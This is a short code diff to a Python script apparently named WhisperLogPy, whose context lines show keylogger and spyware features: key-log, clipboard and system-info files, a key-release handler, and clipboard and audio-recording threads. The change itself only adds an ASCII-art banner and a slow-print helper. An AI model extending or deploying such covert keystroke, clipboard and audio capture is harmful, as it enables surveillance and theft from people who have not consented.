@@ -27,6 +27,22 @@ system_info_path = os.path.join(folder_path, "system.txt")
 clipboard_path = os.path.join(folder_path, "clipboard.txt")
 keys_path = os.path.join(folder_path, "key_log.txt")
 
+BANNER = r"""
+ __        __  _       _                _           
+ \ \      / / | |__   (_)_ __   ___ _ __| | ___  ___ 
+  \ \ /\ / /  | '_ \  | | '_ \ / _ \ '__| |/ _ \/ __|
+   \ V  V /   | | | | | | |_) |  __/ |  | |  __/\__ \
+    \_/\_/    |_| |_| |_| .__/ \___|_|  |_|\___||___/
+                         |_|        WhisperLogPy
+"""
+
+# ---------- Utility ----------
+def slow_print(text, delay=0.02):
+    for c in text:
+        print(c, end="", flush=True)
+        time.sleep(delay)
+    print()
+
 # --- 1. SYSTEM INFORMATION ---
 def get_computer_information():
     with open(system_info_path, "w", encoding="utf-8") as f:
@@ -158,7 +174,7 @@ def on_release(key):
 # --- MAIN EXECUTION ---
 if __name__ == "__main__":
     
-    
+    slow_print(BANNER, delay=0.005)
     threads = [
         threading.Thread(target=clipboard_monitor),
         threading.Thread(target=record_audio)
